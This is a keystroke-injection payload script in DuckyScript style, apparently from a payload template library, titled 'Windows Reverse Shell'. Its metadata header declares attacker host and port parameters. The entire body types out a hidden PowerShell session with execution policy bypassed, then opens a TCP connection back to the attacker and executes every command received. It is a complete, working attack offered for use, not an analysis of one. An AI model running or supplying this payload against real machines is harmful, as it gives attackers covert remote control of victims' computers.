@id: windows-reverse-shell
@name: Windows Reverse Shell
@description: Creates a reverse TCP shell connection from target Windows machine to attacker
@category: windows
@severity: critical
@param: LHOST | string | required | Attacker IP address | 192.168.1.100
@param: LPORT | number | required | Attacker listening port | 4444

DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass
DELAY 500
ENTER
DELAY 2000
STRING $client = New-Object System.Net.Sockets.TCPClient("{{LHOST}}",{{LPORT}});
DELAY 300
ENTER
STRING $s = $client.GetStream();
DELAY 300
ENTER
STRING [byte[]]$b = 0..65535|%{0};
DELAY 300
ENTER
STRING while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;
DELAY 300
ENTER
STRING $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
DELAY 300
ENTER
STRING $sb = (New-Object -TypeName System.Text.ASCIIEncoding).GetBytes((iex $d 2>&1 | Out-String ));
DELAY 300
ENTER
STRING $s.Write($sb, 0, $sb.Length);
DELAY 300
ENTER
STRING $s.Flush();
DELAY 300
ENTER
STRING };
DELAY 300
ENTER
STRING $client.Close();
DELAY 300
ENTER
